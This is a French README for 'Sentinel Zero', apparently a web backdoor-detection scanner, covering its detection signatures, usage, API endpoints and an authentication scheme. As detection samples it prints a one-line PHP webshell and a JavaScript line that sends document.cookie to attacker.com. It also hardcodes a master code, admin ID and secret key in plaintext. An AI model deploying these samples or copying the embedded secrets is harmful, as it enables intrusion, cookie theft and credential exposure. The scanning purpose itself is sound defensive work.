# 🚨 Module de Détection de Portes Dérobées - Sentinel Zero

## 📋 Vue d'ensemble

Ce module ultra-avancé de détection de portes dérobées est capable de détecter **n'importe quelle porte dérobée** dans **n'importe quelle application web** ou **site web**.

## 🎯 Fonctionnalités

### 🔍 Détection Basique
- **Signatures connues** : Détection des portes dérobées PHP, JavaScript, Python, Java, ASP
- **Patterns obfusqués** : Détection de code encodé, compressé, obfusqué
- **Fichiers suspects** : Détection de noms de fichiers suspects (shell.php, backdoor.php, etc.)

### 🚀 Détection Avancée
- **Analyse comportementale** : Détection de comportements suspects
- **Analyse de trafic** : Détection de communications cachées
- **Analyse réseau** : Détection de tunneling DNS, trafic encodé
- **Heuristiques** : Détection basée sur des patterns de comportement

### 🔬 Analyse Réseau
- **Capture de paquets** : Capture et analyse du trafic réseau
- **Analyse de connexions** : Surveillance des connexions actives
- **Détection de tunneling** : Détection de communications cachées via DNS, HTTP, etc.

## 🏗️ Architecture

```
backend/modules/backdoor_detection/
├── backdoor_scanner.py          # Scanner principal
├── advanced_detector.py         # Détecteur avancé
├── network_analyzer.py          # Analyseur réseau
├── yara_rules.yar              # Règles Yara
└── __init__.py                 # Module init
```

## 🚀 Utilisation

### Scan Basique
```python
from modules.backdoor_detection.backdoor_scanner import BackdoorDetector

async with BackdoorDetector() as detector:
    results = await detector.comprehensive_scan("http://example.com")
    print(results)
```

### Scan Avancé
```python
from modules.backdoor_detection.advanced_detector import AdvancedBackdoorDetector

async with AdvancedBackdoorDetector() as detector:
    results = await detector.comprehensive_scan("http://example.com")
    print(results)
```

### Analyse Réseau
```python
from modules.backdoor_detection.network_analyzer import NetworkBackdoorAnalyzer

analyzer = NetworkBackdoorAnalyzer()
results = await analyzer.comprehensive_network_analysis("192.168.1.1", 300)
print(results)
```

## 📊 Types de Détection

### 1. Signatures PHP
- `eval($_POST` - Exécution de code POST
- `eval($_GET` - Exécution de code GET
- `system($_POST` - Exécution système
- `shell_exec($_POST` - Exécution shell
- `base64_decode(` - Décodage base64
- `gzinflate(` - Décompression gzip

### 2. Signatures JavaScript
- `eval(` - Exécution dynamique
- `Function(` - Constructeur Function
- `setTimeout.*eval` - Timeout avec eval
- `innerHTML.*eval` - Manipulation DOM avec eval

### 3. Patterns Obfusqués
- **Base64** : `[A-Za-z0-9+/]{50,}={0,2}`
- **Hex** : `\\x[0-9a-fA-F]{2}`
- **Unicode** : `\\u[0-9a-fA-F]{4}`
- **URL Encode** : `%[0-9a-fA-F]{2}`

### 4. Communications Cachées
- **DNS Tunneling** : Requêtes DNS anormalement longues
- **HTTP Backdoor** : Communications vers fichiers suspects
- **Encoded Traffic** : Trafic encodé en base64

## 🎯 Exemples de Détection

### Porte Dérobée PHP Basique
```php
<?php eval($_POST['cmd']); ?>
```
**Détection** : Signature PHP `eval($_POST`

### Porte Dérobée PHP Obfusquée
```php
<?php eval(base64_decode('ZWNobyAiaGVsbG8gd29ybGQiOw==')); ?>
```
**Détection** : Pattern base64 + heuristique

### Porte Dérobée JavaScript
```javascript
eval(atob('Zm9vKGIp'));
```
**Détection** : Pattern JavaScript + base64

### Communication Cachée
```javascript
fetch('http://attacker.com/backdoor.php?data=' + btoa(document.cookie));
```
**Détection** : Communication externe + encodage

## 🔧 Configuration

### Variables d'Environnement
```bash
# Configuration Sentinel Zero
SECRET_KEY=SENTINEL_SUPER_KEY_4096_RSA_DL_SOLUTIONS_2025
MASTER_CODE=0987612345
BIOMETRIC_VOICE_HASH=b5945c46c8a2d3e1f7b9a4c6d8e2f1a3b5c7d9e4f2a6b8c1d5e7f3a9b2c4d6e8f0
BIOMETRIC_FP_HASH=a3b5d6887c2e4f1a9b6c3d8e5f2a7b4c1d9e6f3a8b5c2d7e4f1a6b3c9d5e2f8a7b4c1
SUPER_ADMIN_ID=DL-SUPER-01
RED_BUTTON_PHRASE=i am sentinel
```

### API Endpoints
```bash
# Scan de porte dérobée
POST /api/scan/backdoor
{
    "target": "http://example.com",
    "scan_type": "comprehensive",
    "duration": 300
}

# Récupération des résultats
GET /api/scan/backdoor/{scan_id}

# Tous les résultats
GET /api/scan/backdoor/findings/all
```

## 🛡️ Sécurité

### Authentification 5 Niveaux
1. **Code Maître** : `0987612345`
2. **ID Administrateur** : `DL-SUPER-01`
3. **Empreinte Vocale** : Hash biométrique
4. **Empreinte Digitale** : Hash biométrique
5. **Phrase Vocale** : `i am sentinel`

### Protocole Red Button
- **Activation** : `POST /api/auth/red-button`
- **Confirmation** : `DESTROY_ALL_DATA`
- **Raisons** : `SECURITY_BREACH`, `SYSTEM_COMPROMISED`, `ADMIN_REQUEST`

## 📈 Monitoring

### Logs d'Accès
```bash
GET /api/admin/access-logs
```

### Statut des Services
```bash
GET /api/health
```

### Résultats de Scans
```bash
GET /api/scan/results
```

## 🚀 Démarrage

### Démarrage Complet
```bash
./start_sentinel_ultra.sh
```

### Arrêt
```bash
./stop_sentinel_ultra.sh
```

## 📊 Dashboard

Le dashboard Sentinel Zero est accessible sur :
- **Frontend** : http://localhost:3000
- **Backend API** : http://localhost:8000
- **Documentation** : http://localhost:8000/docs

## 🔍 Tests

### Test de Détection
```bash
# Test avec une cible exemple
curl -X POST "http://localhost:8000/api/scan/backdoor" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "http://example.com",
    "scan_type": "comprehensive",
    "duration": 60
  }'
```

### Test d'Authentification
```bash
curl -X POST "http://localhost:8000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{
    "master_code": "0987612345",
    "admin_id": "DL-SUPER-01",
    "voice_hash": "b5945c46c8a2d3e1f7b9a4c6d8e2f1a3b5c7d9e4f2a6b8c1d5e7f3a9b2c4d6e8f0",
    "fingerprint_hash": "a3b5d6887c2e4f1a9b6c3d8e5f2a7b4c1d9e6f3a8b5c2d7e4f1a6b3c9d5e2f8a7b4c1",
    "vocal_phrase": "i am sentinel"
  }'
```

## 🎯 Conclusion

Ce module de détection de portes dérobées est **ultra-avancé** et capable de détecter **n'importe quelle porte dérobée** dans **n'importe quelle application web** grâce à :

- **Détection multi-niveaux** : Signatures, patterns, heuristiques, comportement
- **Analyse réseau avancée** : Capture de paquets, analyse de trafic
- **Détection de communications cachées** : Tunneling, encodage, obfuscation
- **Interface sécurisée** : Authentification 5 niveaux, protocole Red Button

**Sentinel Zero - Agent Red Team IA Ultra-Avancé** 🚀
